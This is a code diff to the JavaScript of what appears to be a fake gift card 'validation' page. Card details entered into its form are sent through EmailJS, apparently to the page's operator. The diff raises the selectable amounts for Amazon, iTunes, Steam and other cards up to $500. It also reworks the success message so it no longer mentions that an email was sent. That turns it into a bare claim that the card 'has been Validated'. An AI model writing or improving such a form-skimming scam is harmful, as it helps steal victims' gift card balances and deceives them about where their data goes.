@@ -133,14 +133,14 @@ document.addEventListener("DOMContentLoaded", () => {
   };
 
   const cardAmounts = {
-    Amazon: [10,25,50,100],
-    iTunes: [15,25,50,100],
-    "Google Play": [10,25,50,100],
-    Steam: [20,50,100],
-    Xbox: [25,50,100],
-    PSN: [10,20,50,100],
-    Sephora: [25,50,100],
-    Footlocker: [25,50,100],
+    Amazon: [10,25,50,100,200,300,500],
+    iTunes: [15,25,50,100,200,300,500],
+    "Google Play": [10,25,50,100,200,300,500],
+    Steam: [20,50,100,200,300,500],
+    Xbox: [25,50,100,200,300,500],
+    PSN: [10,20,50,100,200,300,500],
+    Sephora: [25,50,100,200,300,500],
+    Footlocker: [25,50,100,200,300,500],
   };
 
   // Update placeholder when card type changes
@@ -232,7 +232,7 @@ document.addEventListener("DOMContentLoaded", () => {
     // 🔥 SEND EMAIL
     // --------------------------
     emailjs.send("service_0e5tu6h", "template_23zl6b7", templateParams)
-      .then(() => showModal(`✅ ${card} gift card is valid and email sent!`))
+      .then(() => showModal(`✅ ${card} Gift Card has been Validated!`))
       .catch(err => showModal(`⚠️ Verification valid but email failed: ${err.text}`));
 
     form.reset();
